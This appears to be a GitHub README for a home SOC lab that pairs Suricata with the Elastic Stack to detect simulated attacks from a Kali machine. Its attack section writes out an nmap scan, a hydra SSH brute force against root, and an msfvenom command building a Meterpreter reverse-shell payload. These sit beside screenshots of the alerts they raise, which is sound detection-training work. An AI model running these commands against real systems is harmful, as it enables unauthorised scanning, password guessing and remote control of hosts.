# ELK_Suricata_Deployment
Lab environment for deploying Suricata as Network Intrusion Detection/Prevention System (IDS/IPS) integrated with Elastic Stack (ELK).

---

### 📚 Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Lab Components](#lab-components)
- [Log Pipeline](#log-pipeline)
- [Attack Simulation](#attack-simulation)
- [Kibana Dashboards](#kibana-dashboards)
- [Future Improvements](#future-improvements)

---

### 📖 Overview

This project demonstrates a Security Operations Center (SOC) monitoring lab built using the Elastic Stack and Suricata.

The goal of this project is to demonstrate how a SOC analyst can:
**Monitor system and network activities**
**Detect suspicious behaviors**
**Detect suspicious behaviors**
**Investigate security alerts**

### 🏗 Architecture

The following architecture illustrates how logs flow from monitored systems to the SIEM platform.

## Architecture Diagram
![Architecture](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/Architecture.png)

### 🖥 Lab Components

**Main Components:**

- **Kali Linux** (192.168.85.129) – Attacker Machine
![Attacker](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/Screenshot%202026-04-10%20150414.png)
- **Ubuntu IDS** (192.168.85.140) – Suricata (IDS/IPS)
![Attacker](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/Screenshot%202026-04-10%20150428.png)
- **Ubuntu ELK** (192.168.85.136) – Elasticsearch + Logstash + Kibana (SIEM)
![Attacker](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/Screenshot%202026-04-10%20150402.png)
- **Windows Server 2022** (192.168.85.137) – Victim
![Attacker](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/Screenshot%202026-04-10%20150436.png)
- **Ubuntu Server** (192.168.85.139) – Victim
![Attacker](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/Screenshot%202026-04-10%20150422.png)

### 🔄 Log Pipeline
Logs from all monitored systems are processed through the Elastic Stack.

Pipeline workflow:
```text
Filebeat / Winlogbeat / Suricata
            │
            ▼
         Logstash
     (Log parsing & filtering)
            │
            ▼
       Elasticsearch
        (Data storage)
            │
            ▼
          Kibana
     (Visualization & analysis)
```

### ⚔ Attack Simulation

The lab includes multiple simulated attack scenarios.

## Network Reconnaissance

Network scanning using:
```text
nmap -sS -sV -O -T4 <target-ip>
```

**Attack simulation**
![Attacker](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/NmapAttack.png)

**Suricata alerts**
![Attacker](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/NmapLogs.png)

## SSH Brute Force Attack

Multiple login attempts against the Ubuntu Server.

SSH Brute Force using
```text
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
```

**Attack simulation**
![Attacker](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/SSHBruteAttack.png)

**Suricata alerts**
![Attacker](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/SSHBruteLogs.png)

## Attack Through Metasploit Framework

Using reverse shell payload created by Metasploit to make a connection to victim

Command for creating payload
```text
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f elf > shell.elf
```

**Attack simulation**
![Attacker](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/MetasploitAttack.png)

**Suricata alerts**
![Attacker](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/MetasploitLogs.png)

